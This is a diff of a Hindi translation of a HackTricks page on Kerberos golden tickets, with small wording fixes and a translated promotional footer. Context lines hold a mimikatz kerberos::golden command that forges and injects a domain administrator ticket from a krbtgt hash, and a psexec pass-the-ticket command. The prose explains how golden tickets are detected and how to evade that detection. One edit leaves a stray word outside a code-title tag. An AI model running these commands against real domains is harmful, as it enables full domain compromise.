@@ -31,7 +31,7 @@ python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
 {% endcode %}
 
-{% code title="Windows से" %}
+{% code title="From Windows" %} से
 ```bash
 #mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
@@ -47,7 +47,7 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 
 ### सामान्य पहचान को बायपास करना
 
-गोल्डन टिकट का पता लगाने के सबसे सामान्य तरीके **केर्बेरोस ट्रैफ़िक** की जांच करना है। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन करता है**, जो इसके साथ किए गए बाद के TGS अनुरोधों में असामान्य के रूप में खड़ा होगा।
+गोल्डन टिकट का पता लगाने के सबसे सामान्य तरीके **केर्बेरोस ट्रैफ़िक** की जांच करना हैं। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन** करता है, जो इसके साथ किए गए बाद के TGS अनुरोधों में असामान्य के रूप में खड़ा होगा।
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
@@ -55,7 +55,7 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
-दुर्भाग्यवश, TGT का जीवनकाल 4769 में लॉग नहीं किया गया है, इसलिए आप यह जानकारी Windows इवेंट लॉग में नहीं पाएंगे। हालाँकि, आप जो सहसंबंधित कर सकते हैं वह है **4769 को बिना पूर्व 4768 के देखना**। यह **TGT के बिना TGS का अनुरोध करना संभव नहीं है**, और यदि TGT जारी होने का कोई रिकॉर्ड नहीं है, तो हम यह निष्कर्ष निकाल सकते हैं कि इसे ऑफ़लाइन तैयार किया गया था।
+दुर्भाग्यवश, TGT का जीवनकाल 4769 में लॉग नहीं किया गया है, इसलिए आप इस जानकारी को Windows इवेंट लॉग में नहीं पाएंगे। हालाँकि, आप जो सहसंबंधित कर सकते हैं वह है **4769 को बिना पूर्व 4768 के देखना**। यह **TGT के बिना TGS का अनुरोध करना संभव नहीं है**, और यदि TGT जारी होने का कोई रिकॉर्ड नहीं है, तो हम यह निष्कर्ष निकाल सकते हैं कि इसे ऑफ़लाइन तैयार किया गया था।
 
 इस **पता लगाने से बचने के लिए** हीरे के टिकटों की जांच करें:
 
@@ -76,16 +76,16 @@ Get-DomainPolicy | select -expand KerberosPolicy
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>HackTricks का समर्थन करें</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
 
 </details>
 {% endhint %}
